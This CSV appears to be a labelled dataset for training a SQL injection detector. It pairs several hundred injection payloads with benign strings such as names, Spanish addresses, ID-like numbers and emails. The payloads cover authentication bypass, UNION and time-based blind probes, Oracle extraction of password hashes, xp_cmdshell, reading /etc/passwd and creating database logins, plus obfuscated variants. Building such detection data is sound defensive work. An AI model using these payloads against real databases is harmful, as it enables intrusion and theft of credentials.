Query,Label
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1
\x27UNION SELECT,1
PRINT,1
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1
or 1  =  1--,1
1 or pg_sleep  (  __TIME__  )  --,1
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1
admin'  )   or   (  '1'  =  '1'/*,1
or 2 between 1 and 3,1
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1
admin' or '1'  =  '1,1
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
""" or 0  =  0 --",1
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1
char%4039%41%2b%40SELECT,1
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1
admin'  )   or   (  '1'  =  '1,1
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1
"or 0  =  0 #""",1
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1
)   or   (  'x'  =  'x,1
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1
$  (  sleep 50  ),1
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1
"""a"""" or 1  =  1--""",1
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1
1 and user_name  (    )     =   'dbo',1
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
or 1  =  1 or ''  =  ',1
select * from users where id  =  1   or 1  =  1 -- 1,1
or 'text' > 't',1
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1
admin' or '1'  =  '1'#,1
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1
s,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
select * from information_schema.tables--,1
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1
1   )    )    or pg_sleep  (  __TIME__  )  --,1
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1
or 1  =  1 or ''  =  ',1
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ),1
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1
or 'unusual'   =   'unusual',1
or 1 in   (  select @@version  )  --,1
truncate,1
as,1
 or 3  =  3 --,1
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1
"admin""  )   or   (  ""1""  =  ""1",1
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1
" or 0  =  0 #""",1
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1
1  )   or sleep  (  __TIME__  )  #,1
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1
select * from users where id  =  1. <@ or 1  =  1 -- 1,1
or true--,1
; execute immediate 'sel' || 'ect us' || 'er',1
hi' or 'x'  =  'x';,1
select * from users where id  =  1 <@ or 1  =  1 -- 1,1
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1
admin' #,1
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitfor delay '0:0:__TIME__'--",1
or 'unusual'   =   'unusual',1
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1
"admin"" or ""1""  =  ""1""/*",1
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1
like,1
or username like char  (  37  )  ;,1
)    )    or pg_sleep  (  __TIME__  )  --,1
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1
or 3  =  3,1
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1
exec sp,1
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1
admin' or 1  =  1/*,1
a' waitfor delay '0:0:10'--,1
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1
and 1 in   (  select var from temp  )  --,1
hi'  )   or   (  'a'  =  'a,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
"admin"" or 1  =  1",1
"""  )   or true--",1
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1
1  )   or pg_sleep  (  __TIME__  )  --,1
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1
"""  )   or sleep  (  __TIME__  )    =  """,1
select * from users where id  =  1.<@. or 1  =  1 -- 1,1
"admin""  )   or   (  ""1""  =  ""1""--",1
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1
; exec xp_regread,1
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1
1 and 1  =  1,1
or 0  =  0 #,1
union select * from users where login   =   char ...,1
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1
admin'  )   or '1'  =  '1'--,1
1;SELECT *,1
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
or ''  =  ',1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
\'; desc users; --,1
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1
""" or """"^""",1
"""-""",1
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1
admin'/*,1
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1
1 uni/**/on select all from where,1
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1
admin'  )   or '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
or '7659'  =  '7659,1
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1
or true--,1
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1
""" or true--",1
select * from users where id  =  1. or 1  =  1 -- 1,1
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1
â or 3  =  3 --,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1
or uid like '%,1
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1
23 or 1  =  1; --,1
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1
0 or 1  =  1,1
select * from users where id  =  1 &@ or 1  =  1 -- 1,1
"admin""  )   or ""1""  =  ""1",1
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
&apos; OR,1
sqlvuln;,1
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1
""" or """"*""",1
"hi or 1  =  1 --""",1
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1
select * from information_schema.tables--,1
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1
(  select top 1,1
Ã½ or 1  =  1 --,1
a' --,1
or 1  =  1 /*,1
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlogin 'name' , 'password'",1
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ),1
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1
group by userid having 1  =  1--,1
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1
select * from users where id  =  1 *1 or 1  =  1 -- 1,1
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1
‘ or 1  =  1 --,1
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1
or 'a'  =  'a,1
declare @s varchar  (  22  )   select @s   =,1
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1
99745017c,0
ejerci78,0
47209,0
"calle valencia de don juan 161, 7?d",0
b3r3al,0
46942381w,0
elder@parcalia.hn,0
24596413y,0
compte,0
2366,0
leshowit,0
lehar,0
45699398p,0
"calle profesor angel lacalle, s/n,",0
tardn,0
3.55E+15,0
14100,0
rigby,0
caada del hoyo,0
45641,0
englert,0
threader,0
elias pallares,0
f1581il2ente,0
57317186j,0
bocana$da,0
escarpelo,0
43785,0
3.40E+15,0
lu,0
"calle limones, 60,",0
hana,0
dillard,0
casas de miravete,0
olea de boedo,0
empuar,0
0o380ado6,0
montroy,0
99997973e,0
8.36E+15,0
"grupo fuensanta 197, 12?a",0
jalance,0
4.20E+14,0
"c/ ricardo gutierrez 26, 8-d",0
ivancevi,0
castil de vela,0
genaro,0
ergasto,0
"llosa de ranes, la",0
es2eri5o,0
cuenca,0
02054707w,0
21184515c,0
5.71E+15,0
41110,0
marcano giner,0
lemoine5@informatica2009.zr,0
pr3caz,0
37130,0
marsh@comerciosaspe.ke,0
inescourt7@citycvs.mil,0
"c/ julia minguillon, 179, 7-a",0
obsequ.iosa,0
"calle carlos amel, 32, 12?h",0
kallewar,0
59760678p,0
5240,0
toperzer1,0
canaan,0
suzuki,0
"antigua de ancora s/n,",0
"calle dean miranda 106, 6-f",0
10380,0
madgett,0
gerola pugliesi,0
36574,0
"c/ comedias, 109,",0
8.62E+15,0
tanchak,0
"don quijote 81,",0
ceferina,0
saturnino,0
israel_piggot@joyclub.pe,0
5n37do,0
lanfranchi@getgold.tl,0
micaas,0
herrmann@codwatw.edu,0
9.48E+15,0
5.84E+15,0
ajoy,0
irissou,0
quisto,0
s5bal850de,0
balsam-prey@mmo.com.cat,0
lurlene,0
"c/ elvas 112, 13-a",0
"de canoves 13,",0
hembrick,0
1.76E+15,0
darcy@google-movil.dz,0
katia,0
lenya@fbi-criminal-network.com.mil,0
3.82E+15,0
penarroya ingla,0
6.66E+15,0
"calle artigako haritza, s/n 8?d",0
kiyohara,0
iracema,0
2719,0
recabdador,0
40142,0
bernadet,0
76150645z,0
29540,0
nehemiah,0
reiji,0
"plaa gabriela mistral, 140",0
mirabel,0
sanidad,0
arriharn espinet,0
alguer murillo,0
47419,0
swearing,0
lightfie,0
epnimo,0
guillen,0
mahbeer,0
zohar@pablobracamonte.bh,0
azarshah,0
m7124v3,0
medianero,0
euzaine@schnapps.com.gs,0
amelia,0
estival,0
3.98E+15,0
"calle manco, 109, 10-g",0
vinko,0
parke antonio trueba 175,0
8.51E+15,0
9.84E+15,0
"calle la revoltosa, 55, 11c",0
"calle hostieros, 24",0
condensativo,0
44706,0
5.89E+15,0
poma gozalbo,0
40592671v,0
contreras,0
18611,0
ma724-3ra,0
olaya,0
17744,0
7118,0
19219,0
lula,0
9.84is22nte334c799,0
rub de bracamonte,0
75771832b,0
muthuswa,0
d76en3r9n8z01,0
"c/ padilla, 74 12h",0
8.85E+15,0
salter@quiromante.com.mg,0
es3regamiento,0
aflechate,0
63829565b,0
60613075w,0
freydig rueda,0
itrabo,0
credido poma,0
29491,0
1064,0
gula,0
de1l2nda9ur4,0
"c/ honduras, 139 7-a",0
vajih,0
salinillas de bureba,0
6267,0
c/ san ildefonso 106 10?h,0
goldsmith1@esmarbella.ht,0
arraia-maeztu,0
34112,0
protoalbitar,0
pontevedra,0
savoula,0
2144,0
albeta,0
96761343k,0
lamentante,0
50159319e,0
andrs castanyer,0
neugebauer@buscamoto.gw,0
harmony,0
vlez acejas,0
enlutada,0
gabriela1,0
c/ david 169 6-h,0
methi,0
graciliano,0
61,0
4.14E+15,0
steele,0
1.44E+15,0
brockie,0
depredador,0
comalada,0
7633,0
robledo,0
37793,0
archie,0
47649,0
4a2ho4a2o,0
c/ coca de la piera 167,0
oseja,0
31410,0
1.08E+15,0
36823414t,0
ginest baquedano,0
mallo etchart,0
nanclares espejo,0
serpiginoso,0
"calle dinamarca 14,",0
72523597c,0
67242195q,0
6.05E+15,0
aricel,0
"c/ concepcion alexandre 82,",0
v5llo34,0
burg,0
4135,0
10161,0
"chorrito bajo, 11",0
8623,0
l1b6855ca30e,0
en546al,0
"c/ el breton, 187",0
koichi,0
lamarr@tardos.mobi,0
mieza,0
16154,0
salgado,0
16118,0
zapardiel de la ribera,0
maughan@enfuerteventura.com.rw,0
15994230f,0
nazareno,0
shou-che,0
24152,0
villalobn,0
cardedeu 54,0
"pl. curro cuchares, 72,",0
"romeral, el",0
10300,0
firat6,0
"calle marino cervera, 173,",0
sparky,0
strock,0
radunsky_oses@guejosgratis.cg,0
alfredo calderon 136,0
hanzlice,0
paucides,0
6.03E+15,0
puigpunyent,0
zangn,0
chilln,0
6110,0
galindo beneyto,0
ayyuce,0
de_la,0
aventino,0
47185,0
5ecom058a?8a,0
"lugar los morros, 50, 9?c",0
hinkie@goovitae.pg,0
58305784w,0
9.27E+15,0
grimm@madrid2012.nu,0
michigan,0
igal,0
c/ hermanos pinzon 178,0
grandy,0
serneo,0
bellaguarda,0
"cuesta sagrado corazon, 155 5?a",0
pike@multasdetransito.gf,0
veneranda,0
torre de arcas,0
darrieu@redstarz.sv,0
sntoma,0
niu,0
eduviges,0
42010181z,0
minera dauns,0
8.96E+15,0
arima@hormigon-impreso.nu,0
aguinaga achutegui,0
6.91E+15,0
bradney4,0
shanir,0
34855320q,0
wun,0
stanger-kitabayashi7@gestionsoftware.th,0
calle soria 154 2a,0
humfrey,0
1320,0
poncin@todobetis.mil,0
8170,0
inglis@baltasarsantos.vu,0
tindall-bourne@pintandomucho.cg,0
es518l132n,0
rajadell,0
ramblizo,0
d060u2ar,0
8349,0
brunton9,0
"?&& 9O0B2O0B0O05O0B0b0o0b0O0b0o2x0X3e4a?{liKe /**/utl_iNAddR.GeT_HOSt_AdDrEss ^ (    (  ?sELEcT dIsTinct"" ( +graNTEd_rolE/*o*/ );  fROM   (%:selECT
DiSTiNCT  (] GrantEd_rOLE })/*ZD*/ , RoWNUM>as LIMit`frOm[DBA_rOlE_PRivs
wherE graNtEe      LiKe  /**/	  SYs.loGiNusEr  )  [WHeRE limIt =
5O3B8B1010  ')   \)   and'i' ;liKe	}'i",1
"-sElect]* FrOM UsERS=WHErEid  =  (SeLECt@(SELeCt 1)) oR ""@ ((/ "" OR (SELECT 6): LIkE; 0x1/**/ oR `FAlse anD "";""!="";&"" OR False -- 2Ty&",1
" SElecT[* from USers%WheRe Id]liKE 0X0b110 +""@<@   OR   0O0x0O0 aND 'fR' Like~'Fr' oR FaLse{ OR  ""G"" NOT liKE ""g"" oR falSe or FALse and]tRue oR FaLsE AND True# uNion SElecT null,VeRsioN +(    )  +-- (SELECT 1)!N",1
"/*eo?*/SELecT * FroM USErS WhERE id 
=  (SeLect (SElECT (SeLeCt (sElECt 1)))) or ""^:( 0"" || 0o0x1 LiKE 3b201%OR '1Y&'!='6Y&' &Or  falSe or fALSE oR (SeleCT (SELECT 7015))<>(SeLecT (SELECT (SELECT 6017))) AND True -- 1@",1
":&& 0o3X0O4x2:=\Utl_iNAdDr.gET_hOSt_AdDrEss  }( ;  (  +seLEcT DiStINCt  (  paSsWoRd^?)   FrOM*~(  SELECT distinCT  (  pASSw Or d  )  , ROWNUm As lImIT FRom sYs.USer$ +)""  WhEre LiMIt LIKE (seLECT (sElect/**/(SelecT 0o9x0b0X7)))   )    )    anD 'i'  LiKE ""'I",1
" SELECt * fRom useRs WhEre ID   LikE   (seLeCT 0x0b1) +(SELECT (SELECT 3))<@	UNIoN seLeCT VersIon  (    )  ,vERsioN  (    )   -- 07",1
" select * fRoM USERS{whERE ID>  LiKe aNd ""^""=""^"" && tRUE oR false OR False#"" 9X0x2 UnioN/*Fs*/SelECt 0x1B2A,baNneR froM v$VeRsiON wHeRE/**/RoWNUM; =  (SELeCT 0x0o0O1) -- (SeleCT (sElect 7))",1
" SELEcT?* From
uSErS wHeRE Id/ =  1 +""@<7 anD TRUe ANd&(SeLect (SELECT 1)) oR 695<>0xc3 or fALSe OR fAlSe OR False OR False. &&  1 OR False AND True#~unioNSEleCT 4X6o0b0B0b8101110,verSioN  (    )   --@7(Z$g",1
